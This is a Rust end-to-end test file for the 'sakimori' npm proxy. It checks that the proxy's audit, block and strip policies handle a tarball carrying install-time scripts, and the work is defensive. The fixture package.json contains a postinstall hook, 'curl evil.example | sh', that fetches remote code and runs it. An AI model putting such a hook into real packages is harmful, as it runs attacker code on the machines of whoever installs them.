//! End-to-end matrix: `--lifecycle-policy {audit, block, strip}`
//! exercised against a real HTTPS upstream serving an npm-shaped
//! tarball with install-time scripts.
//!
//! Why a separate file vs extending `proxy_https_e2e.rs`: that file
//! proves the packument-rewriting + CA-trust paths work end-to-end.
//! This file proves the Shai-Hulud-class defence (the lifecycle
//! gate) actually behaves the way the CLI flag advertises when a
//! malicious-looking tarball is fetched. Three scenarios, one per
//! policy, each driving the full TLS chain through the proxy:
//!
//! - `audit` → 200, body byte-identical to upstream (no rewrite),
//!   scripts are logged but the install would proceed.
//! - `block` → 403 with `x-sakimori-deny: lifecycle-script`,
//!   the install fails closed.
//! - `strip` → 200, body is a rewritten gzipped tar whose
//!   `package/package.json` has the install-time script keys
//!   removed. npm would EINTEGRITY against the original
//!   packument hash, but for this test we're proving the rewrite
//!   happened, not the integrity flow (covered by
//!   `lifecycle_strip_roundtrip.rs`).
//!
//! TLS plumbing reuses the same trick `proxy_https_e2e.rs` uses:
//! self-signed upstream on `localhost`, proxy `extra_upstream_roots`
//! trusts it, ureq client trusts the proxy's MITM CA.

use std::io::Write;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use flate2::Compression;
use flate2::read::GzDecoder;
use flate2::write::GzEncoder;
use hudsucker::rustls as hud_rustls;
use sakimori_proxy::ca::CaFiles;
use sakimori_proxy::lifecycle::LifecyclePolicy;
use sakimori_proxy::{ProxyConfig, RegistryHosts};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::Notify;

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

/// A real .tgz holding `package/package.json` with all four
/// lifecycle scripts. The strip path will produce different bytes;
/// audit + block see this body unchanged.
fn malicious_tarball() -> Vec<u8> {
    let pkg_json = br#"{"name":"demo","version":"1.0.0","scripts":{"preinstall":"a","install":"b","postinstall":"curl evil.example | sh","prepare":"c","test":"jest"}}"#;
    let index_js = b"console.log('hi');\n";

    let mut tar_bytes = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut tar_bytes);
        for (path, body) in [
            ("package/package.json", &pkg_json[..]),
            ("package/index.js", &index_js[..]),
        ] {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_entry_type(tar::EntryType::Regular);
            header.set_cksum();
            builder.append_data(&mut header, path, body).unwrap();
        }
        builder.finish().unwrap();
    }
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&tar_bytes).unwrap();
    gz.finish().unwrap()
}

// ---------------------------------------------------------------------------
// TLS test harness (mirrors proxy_https_e2e.rs)
// ---------------------------------------------------------------------------

fn tmp_dir(tag: &str) -> std::path::PathBuf {
    // Atomic counter on top of `nanos` so parallel tests can't
    // collide on a coarse SystemTime resolution (observed: under
    // load two `proxy` config dirs landed on the same path,
    // overwriting each other's `ca.pem` and producing a
    // `BadSignature` from a client trusting the wrong CA).
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let seq = SEQ.fetch_add(1, Ordering::Relaxed);
    std::env::temp_dir().join(format!(
        "sakimori-lifecycle-e2e-{tag}-{}-{nanos}-{seq}",
        std::process::id()
    ))
}

struct SelfSigned {
    cert_pem_path: std::path::PathBuf,
    cert_der: Vec<u8>,
    key_der: Vec<u8>,
}

fn self_signed_for_localhost(tag: &str) -> SelfSigned {
    use rcgen::{CertificateParams, DistinguishedName, DnType, IsCa, KeyPair, SanType};
    let mut params = CertificateParams::default();
    params.distinguished_name = DistinguishedName::new();
    params
        .distinguished_name
        .push(DnType::CommonName, "sakimori-test-upstream");
    params.subject_alt_names = vec![
        SanType::IpAddress(std::net::IpAddr::V4(std::net::Ipv4Addr::new(127, 0, 0, 1))),
        SanType::DnsName("localhost".try_into().unwrap()),
    ];
    let now = time::OffsetDateTime::now_utc();
    params.not_before = now - time::Duration::days(1);
    params.not_after = now + time::Duration::days(365);
    params.is_ca = IsCa::NoCa;
    let key = KeyPair::generate().unwrap();
    let cert = params.self_signed(&key).unwrap();
    let dir = tmp_dir(tag);
    std::fs::create_dir_all(&dir).unwrap();
    let cert_pem_path = dir.join("ca.pem");
    std::fs::write(&cert_pem_path, cert.pem()).unwrap();
    SelfSigned {
        cert_pem_path,
        cert_der: cert.der().to_vec(),
        key_der: key.serialize_der(),
    }
}

/// Mock TLS upstream that responds to **any** GET with the npm
/// tarball body. The Content-Type is `application/octet-stream`
/// — npm/cargo etc. don't care, and the proxy's lifecycle gate
/// triggers off the URL shape (`<pkg>/-/<pkg>-<ver>.tgz`), not
/// the Content-Type.
async fn spawn_mock_tarball_upstream(cert: &SelfSigned, body: Vec<u8>) -> std::net::SocketAddr {
    use hud_rustls::pki_types::{CertificateDer, PrivateKeyDer};
    let cert_chain = vec![CertificateDer::from(cert.cert_der.clone())];
    let key = PrivateKeyDer::try_from(cert.key_der.clone()).unwrap();
    let server_config = hud_rustls::ServerConfig::builder_with_provider(Arc::new(
        hud_rustls::crypto::aws_lc_rs::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_no_client_auth()
    .with_single_cert(cert_chain, key)
    .unwrap();
    let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(server_config));
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let body = Arc::new(body);
    tokio::spawn(async move {
        loop {
            let (sock, _peer) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => break,
            };
            let acc = acceptor.clone();
            let body = body.clone();
            tokio::spawn(async move {
                let Ok(mut tls) = acc.accept(sock).await else {
                    return;
                };
                let mut buf = Vec::with_capacity(2048);
                let mut tmp = [0u8; 1024];
                loop {
                    match tls.read(&mut tmp).await {
                        Ok(0) => return,
                        Ok(n) => {
                            buf.extend_from_slice(&tmp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                            if buf.len() > 64 * 1024 {
                                return;
                            }
                        }
                        Err(_) => return,
                    }
                }
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    body.len()
                );
                let _ = tls.write_all(resp.as_bytes()).await;
                let _ = tls.write_all(&body).await;
                let _ = tls.shutdown().await;
            });
        }
    });
    addr
}

async fn spawn_proxy_with_policy(
    extra_upstream_roots: Vec<std::path::PathBuf>,
    policy: Option<LifecyclePolicy>,
) -> (std::net::SocketAddr, std::path::PathBuf) {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    drop(listener);

    let config_dir = tmp_dir("proxy");
    std::fs::create_dir_all(&config_dir).unwrap();
    let ca_pem_path = CaFiles::at(config_dir.clone()).cert_pem;

    let mut cfg = ProxyConfig::default_dev().unwrap();
    cfg.listen = addr;
    cfg.ca_files = CaFiles::at(config_dir);
    cfg.install_log_enabled = false;
    cfg.registries = RegistryHosts {
        npm: vec!["localhost".into()],
        ..RegistryHosts::default()
    };
    cfg.extra_upstream_roots = extra_upstream_roots;
    cfg.lifecycle_policy = policy;

    tokio::spawn(async move {
        if let Err(e) = sakimori_proxy::run(cfg).await {
            eprintln!("proxy exited: {e:#}");
        }
    });

    let ready = Arc::new(Notify::new());
    let ready2 = ready.clone();
    tokio::spawn(async move {
        for _ in 0..200 {
            if tokio::net::TcpStream::connect(addr).await.is_ok() {
                ready2.notify_one();
                return;
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
    });
    tokio::time::timeout(Duration::from_secs(6), ready.notified())
        .await
        .expect("proxy did not come up");

    (addr, ca_pem_path)
}

/// HTTPS GET through the proxy, returning `(status, body_bytes)`.
fn https_get(
    proxy_addr: std::net::SocketAddr,
    proxy_ca_pem: &std::path::Path,
    url: &str,
) -> Result<(u16, Vec<u8>, Option<String>), String> {
    use rustls::RootCertStore;
    use rustls::pki_types::CertificateDer;
    use rustls::pki_types::pem::PemObject;

    let pem_bytes = std::fs::read(proxy_ca_pem).map_err(|e| e.to_string())?;
    let mut roots = RootCertStore::empty();
    for cert in CertificateDer::pem_slice_iter(&pem_bytes) {
        let cert = cert.map_err(|e| e.to_string())?;
        roots.add(cert).map_err(|e| e.to_string())?;
    }
    let tls = rustls::ClientConfig::builder_with_provider(Arc::new(
        rustls::crypto::aws_lc_rs::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .map_err(|e| e.to_string())?
    .with_root_certificates(roots)
    .with_no_client_auth();

    let proxy_spec = format!("http://{proxy_addr}");
    let agent = ureq::AgentBuilder::new()
        .tls_config(Arc::new(tls))
        .proxy(ureq::Proxy::new(&proxy_spec).map_err(|e| e.to_string())?)
        .timeout(Duration::from_secs(10))
        .build();

    let do_get = agent.get(url).call();
    match do_get {
        Ok(r) => {
            let status = r.status();
            let deny = r.header("x-sakimori-deny").map(|s| s.to_string());
            let mut buf = Vec::new();
            use std::io::Read;
            r.into_reader()
                .take(4 * 1024 * 1024)
                .read_to_end(&mut buf)
                .map_err(|e| e.to_string())?;
            Ok((status, buf, deny))
        }
        Err(ureq::Error::Status(code, r)) => {
            let deny = r.header("x-sakimori-deny").map(|s| s.to_string());
            let mut buf = Vec::new();
            use std::io::Read;
            let _ = r.into_reader().take(4 * 1024 * 1024).read_to_end(&mut buf);
            Ok((code, buf, deny))
        }
        Err(other) => Err(format!("transport:{other:?}")),
    }
}

fn extract_package_json(tgz: &[u8]) -> serde_json::Value {
    let dec = GzDecoder::new(tgz);
    let mut archive = tar::Archive::new(dec);
    for entry in archive.entries().unwrap() {
        let mut e = entry.unwrap();
        if e.path()
            .unwrap()
            .to_str()
            .map(|s| s == "package/package.json")
            .unwrap_or(false)
        {
            use std::io::Read;
            let mut body = Vec::new();
            e.read_to_end(&mut body).unwrap();
            return serde_json::from_slice(&body).unwrap();
        }
    }
    panic!("package/package.json not found in tarball");
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn lifecycle_audit_passes_tarball_through_unmodified() {
    let cert = self_signed_for_localhost("ca-audit");
    let tgz = malicious_tarball();
    let upstream = spawn_mock_tarball_upstream(&cert, tgz.clone()).await;
    let (proxy_addr, ca_pem) = spawn_proxy_with_policy(
        vec![cert.cert_pem_path.clone()],
        Some(LifecyclePolicy::Audit),
    )
    .await;

    let url = format!(
        "https://localhost:{}/demo/-/demo-1.0.0.tgz",
        upstream.port()
    );
    let (status, body, deny) =
        tokio::task::spawn_blocking(move || https_get(proxy_addr, &ca_pem, &url))
            .await
            .unwrap()
            .expect("audit mode must serve the tarball");

    assert_eq!(status, 200);
    assert!(
        deny.is_none(),
        "audit mode must not set x-sakimori-deny, got {deny:?}"
    );
    assert_eq!(
        body, tgz,
        "audit mode must pass the tarball through byte-for-byte"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn lifecycle_block_returns_403_with_deny_header() {
    let cert = self_signed_for_localhost("ca-block");
    let tgz = malicious_tarball();
    let upstream = spawn_mock_tarball_upstream(&cert, tgz).await;
    let (proxy_addr, ca_pem) = spawn_proxy_with_policy(
        vec![cert.cert_pem_path.clone()],
        Some(LifecyclePolicy::Block),
    )
    .await;

    let url = format!(
        "https://localhost:{}/demo/-/demo-1.0.0.tgz",
        upstream.port()
    );
    let (status, _body, deny) =
        tokio::task::spawn_blocking(move || https_get(proxy_addr, &ca_pem, &url))
            .await
            .unwrap()
            .expect("block mode returns 403, not a transport error");

    assert_eq!(status, 403, "block mode must 403");
    assert_eq!(
        deny.as_deref(),
        Some("lifecycle-script"),
        "block mode must set x-sakimori-deny: lifecycle-script, got {deny:?}",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn lifecycle_strip_rewrites_tarball_dropping_install_scripts() {
    let cert = self_signed_for_localhost("ca-strip");
    let tgz = malicious_tarball();
    let upstream = spawn_mock_tarball_upstream(&cert, tgz.clone()).await;
    let (proxy_addr, ca_pem) = spawn_proxy_with_policy(
        vec![cert.cert_pem_path.clone()],
        Some(LifecyclePolicy::Strip),
    )
    .await;

    let url = format!(
        "https://localhost:{}/demo/-/demo-1.0.0.tgz",
        upstream.port()
    );
    let (status, body, deny) =
        tokio::task::spawn_blocking(move || https_get(proxy_addr, &ca_pem, &url))
            .await
            .unwrap()
            .expect("strip mode serves a rewritten tarball");

    assert_eq!(status, 200);
    assert!(deny.is_none(), "strip mode must not set deny header");
    assert_ne!(
        body, tgz,
        "strip mode must rewrite the tarball, not return the original bytes"
    );

    // Body must still be a valid gzipped tar with package.json
    // present. Verify the lifecycle keys are gone, the
    // non-lifecycle `test` script survives.
    let pkg = extract_package_json(&body);
    let scripts = pkg["scripts"]
        .as_object()
        .expect("scripts object survives strip");
    for k in ["preinstall", "install", "postinstall", "prepare"] {
        assert!(
            !scripts.contains_key(k),
            "strip must remove lifecycle script `{k}`, package.json: {pkg}"
        );
    }
    assert_eq!(
        scripts["test"], "jest",
        "non-lifecycle script `test` must survive strip"
    );
}

// Without `--lifecycle-policy` set, the gate is OFF — verifies the
// default behaviour: tarball flows through byte-for-byte regardless
// of script content. Pins the "off by default" invariant.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn lifecycle_default_off_passes_tarball_through() {
    let cert = self_signed_for_localhost("ca-default");
    let tgz = malicious_tarball();
    let upstream = spawn_mock_tarball_upstream(&cert, tgz.clone()).await;
    let (proxy_addr, ca_pem) =
        spawn_proxy_with_policy(vec![cert.cert_pem_path.clone()], None).await;

    let url = format!(
        "https://localhost:{}/demo/-/demo-1.0.0.tgz",
        upstream.port()
    );
    let (status, body, deny) =
        tokio::task::spawn_blocking(move || https_get(proxy_addr, &ca_pem, &url))
            .await
            .unwrap()
            .expect("default config serves the tarball");
    assert_eq!(status, 200);
    assert!(deny.is_none(), "default off must not set deny header");
    assert_eq!(
        body, tgz,
        "default off must pass tarball through byte-for-byte"
    );
}
